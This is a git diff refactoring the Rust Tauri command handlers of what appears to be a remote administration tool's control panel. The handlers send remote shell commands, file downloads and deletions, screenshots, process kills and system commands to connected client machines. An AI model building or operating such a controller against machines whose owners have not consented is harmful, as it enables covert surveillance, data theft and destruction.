@@ -1,50 +1,12 @@
-use serde::Serialize;
-use std::sync::{Arc, Mutex};
 use tauri::State;
-
-use crate::server::Server;
-
-use common::commands::{Command, File, Process};
-
-pub struct SharedServer(pub Arc<Mutex<Server>>);
-pub struct SharedTauriState(pub Arc<Mutex<TauriState>>);
-
-#[derive(Debug, Clone, Serialize)]
-pub struct FrontClient {
-    pub id: usize,
-    pub username: String,
-    pub hostname: String,
-    pub os: String,
-    pub ram: String,
-    pub cpu: String,
-    pub gpus: Vec<String>,
-    pub storage: Vec<String>,
-    pub displays: i32,
-    pub ip: String,
-    pub disconnected: bool,
-    pub is_elevated: bool,
-}
-
-#[derive(Debug, Clone, Serialize)]
-pub struct TauriState {
-    pub port: String,
-    pub running: bool
-}
-
-impl Default for TauriState {
-    fn default() -> Self {
-        TauriState {
-            port: "1337".to_string(),
-            running: false
-        }
-    }
-}
+use crate::handlers::{ SharedServer, SharedTauriState, FrontClient, TauriState };
+use common::commands::{ Command, File, Process };
 
 #[tauri::command]
 pub fn start_server(
     port: &str,
     server_state: State<'_, SharedServer>,
-    tauri_state: State<'_, SharedTauriState>,
+    tauri_state: State<'_, SharedTauriState>
 ) -> String {
     let mut server = server_state.0.lock().unwrap();
     let running = server.listen_port(port.to_string());
@@ -54,7 +16,7 @@ pub fn start_server(
     if !running {
         tauri_state.running = false;
         return "false".to_string();
-    };
+    }
 
     tauri_state.port = port.to_string();
     tauri_state.running = true;
@@ -63,9 +25,7 @@ pub fn start_server(
 }
 
 #[tauri::command]
-pub fn fetch_state(
-    tauri_state: State<'_, SharedTauriState>,
-) -> TauriState {
+pub fn fetch_state(tauri_state: State<'_, SharedTauriState>) -> TauriState {
     let tauri_state = tauri_state.0.lock().unwrap();
     tauri_state.clone()
 }
@@ -73,12 +33,12 @@ pub fn fetch_state(
 #[tauri::command]
 pub fn fetch_clients(
     server_state: State<'_, SharedServer>,
-    tauri_state: State<'_, SharedTauriState>,
+    tauri_state: State<'_, SharedTauriState>
 ) -> Vec<FrontClient> {
     let server = server_state.0.lock().unwrap();
 
     let tauri_state = tauri_state.0.lock().unwrap();
-    
+
     if !tauri_state.running {
         return vec![];
     }
@@ -93,7 +53,7 @@ pub fn fetch_clients(
 
         if client.is_disconnect() {
             continue;
-        }   
+        }
 
         let front_client = FrontClient {
             id: i,
@@ -116,7 +76,7 @@ pub fn fetch_clients(
 }
 
 #[tauri::command]
-pub fn fetch_client (id: &str, server_state: State<'_, SharedServer>) -> FrontClient {
+pub fn fetch_client(id: &str, server_state: State<'_, SharedServer>) -> FrontClient {
     let server = server_state.0.lock().unwrap();
 
     let client_id = id.parse::<usize>().unwrap();
@@ -140,29 +100,33 @@ pub fn fetch_client (id: &str, server_state: State<'_, SharedServer>) -> FrontCl
     }
 }
 
-
 #[tauri::command]
-pub fn read_files(id: &str, run: &str, path: &str, server_state: State<'_, SharedServer>) -> (String, Vec<File>) {
+pub fn read_files(
+    id: &str,
+    run: &str,
+    path: &str,
+    server_state: State<'_, SharedServer>
+) -> (String, Vec<File>) {
     let mut server = server_state.0.lock().unwrap();
 
     let client_id = id.parse::<usize>().unwrap();
 
-    server.reset_files();
-    server.reset_folder_path();
-
     let mut clients = server.clients.lock().unwrap();
     let client = clients.get_mut(client_id).unwrap();
 
+    client.reset_files();
+    client.reset_path();
+
     match run {
         "previous_dir" => {
-            client.write_buffer(Command::PreviousDir);
-        },
+            client.write_buffer(Command::PreviousDir, &Some(client.get_secret()));
+        }
         "available_disks" => {
-            client.write_buffer(Command::AvailableDisks);
-        },
+            client.write_buffer(Command::AvailableDisks, &Some(client.get_secret()));
+        }
         "view_dir" => {
-            client.write_buffer(Command::ViewDir(path.to_string()));
-        },
+            client.write_buffer(Command::ViewDir(path.to_string()), &Some(client.get_secret()));
+        }
         _ => {
             return ("".to_string(), vec![]);
         }
@@ -170,11 +134,16 @@ pub fn read_files(id: &str, run: &str, path: &str, server_state: State<'_, Share
 
     std::thread::sleep(std::time::Duration::from_millis(200));
 
-    (server.get_folder_path(), server.get_files())
+    (client.get_path(), client.get_files())
 }
 
 #[tauri::command]
-pub fn manage_file(id: &str, run: &str, file: &str, server_state: State<'_, SharedServer>) -> String {
+pub fn manage_file(
+    id: &str,
+    run: &str,
+    file: &str,
+    server_state: State<'_, SharedServer>
+) -> String {
     let server = server_state.0.lock().unwrap();
 
     let client_id = id.parse::<usize>().unwrap();
@@ -184,19 +153,19 @@ pub fn manage_file(id: &str, run: &str, file: &str, server_state: State<'_, Shar
 
     match run {
         "download_file" => {
-            client.write_buffer(Command::DownloadFile(file.to_string()));
-        },
+            client.write_buffer(Command::DownloadFile(file.to_string()), &Some(client.get_secret()));
+        }
         "remove_file" => {
-            client.write_buffer(Command::RemoveFile(file.to_string()));
-        },
+            client.write_buffer(Command::RemoveFile(file.to_string()), &Some(client.get_secret()));
+        }
         "remove_dir" => {
-            client.write_buffer(Command::RemoveDir(file.to_string()));
-        },
+            client.write_buffer(Command::RemoveDir(file.to_string()), &Some(client.get_secret()));
+        }
         _ => {
             return "false".to_string();
         }
     }
-    
+
     "true".to_string()
 }
 
@@ -209,7 +178,7 @@ pub fn take_screenshot(id: &str, display: i32, server_state: State<'_, SharedSer
     let mut clients = server.clients.lock().unwrap();
     let client = clients.get_mut(client_id).unwrap();
 
-    client.write_buffer(Command::ScreenshotDisplay(display.to_string()));
+    client.write_buffer(Command::ScreenshotDisplay(display.to_string()), &Some(client.get_secret()));
 }
 
 #[tauri::command]
@@ -221,8 +190,8 @@ pub fn handle_system_command(id: &str, run: &str, server_state: State<'_, Shared
     let mut clients = server.clients.lock().unwrap();
     let client = clients.get_mut(client_id).unwrap();
 
-    client.write_buffer(Command::ManageSystem(run.to_string()));
-    
+    client.write_buffer(Command::ManageSystem(run.to_string()), &Some(client.get_secret()));
+
     "true".to_string()
 }
 
@@ -234,13 +203,13 @@ pub fn manage_shell(id: &str, run: &str, server_state: State<'_, SharedServer>) 
 
     let mut clients = server.clients.lock().unwrap();
     let client = clients.get_mut(client_id).unwrap();
-    
+
     if run == "start" {
         if client.shell_started {
             return "true".to_string();
         }
         client.shell_started = true;
-        client.write_buffer(Command::StartShell);
+        client.write_buffer(Command::StartShell, &Some(client.get_secret()));
         return "true".to_string();
     }
 
@@ -249,17 +218,18 @@ pub fn manage_shell(id: &str, run: &str, server_state: State<'_, SharedServer>) 
             return "false".to_string();
         }
         client.shell_started = false;
-        client.write_buffer(Command::ExitShell);
+        client.write_buffer(Command::ExitShell, &Some(client.get_secret()));
         return "false".to_string();
     }
 
-    if run =="status"{
-        if client.shell_started {return "true".to_string();}
+    if run == "status" {
+        if client.shell_started {
+            return "true".to_string();
+        }
         return "false".to_string();
     }
-    
+
     "false".to_string()
-
 }
 
 #[tauri::command]
@@ -274,9 +244,7 @@ pub fn execute_shell_command(id: &str, run: &str, server_state: State<'_, Shared
     let client = clients.get_mut(client_id).unwrap();
 
     if client.shell_started {
-        let shell_cmd = Command::ShellCommand(run.to_string());
-
-        client.write_buffer(shell_cmd);
+        client.write_buffer(Command::ShellCommand(run.to_string()), &Some(client.get_secret()));
     }
 }
 
@@ -289,11 +257,16 @@ pub fn process_list(id: &str, server_state: State<'_, SharedServer>) {
     let mut clients = server.clients.lock().unwrap();
     let client = clients.get_mut(client_id).unwrap();
 
-    client.write_buffer(Command::GetProcessList);
+    client.write_buffer(Command::GetProcessList, &Some(client.get_secret()));
 }
 
 #[tauri::command]
-pub fn kill_process(id: &str, pid: usize, name: &str, server_state: State<'_, SharedServer>) -> String {
+pub fn kill_process(
+    id: &str,
+    pid: usize,
+    name: &str,
+    server_state: State<'_, SharedServer>
+) -> String {
     let server = server_state.0.lock().unwrap();
 
     let client_id = id.parse::<usize>().unwrap();
@@ -301,12 +274,33 @@ pub fn kill_process(id: &str, pid: usize, name: &str, server_state: State<'_, Sh
     let mut clients = server.clients.lock().unwrap();
     let client = clients.get_mut(client_id).unwrap();
 
-    let process = Process {
-        pid,
-        name: name.to_string(),
-    };
-
-    client.write_buffer(Command::KillProcess(process));
+    client.write_buffer(Command::KillProcess(Process {pid, name: name.to_string()}), &Some(client.get_secret()));
 
     "true".to_string()
+}
+
+#[tauri::command]
+pub fn manage_client(
+    id: &str,
+    run: &str,
+    server_state: State<'_, SharedServer>
+) {
+    println!("doing sometihing");
+    let server = server_state.0.lock().unwrap();
+
+    let client_id = id.parse::<usize>().unwrap();
+
+    let mut clients = server.clients.lock().unwrap();
+    let client = clients.get_mut(client_id).unwrap();
+
+    match run {
+        "disconnect" => {
+            client.write_buffer(Command::Disconnect, &Some(client.get_secret()));
+        }
+        "reconnect" => {
+            client.write_buffer(Command::Reconnect, &Some(client.get_secret()));
+        }
+        _ => {
+        }
+    }
 }
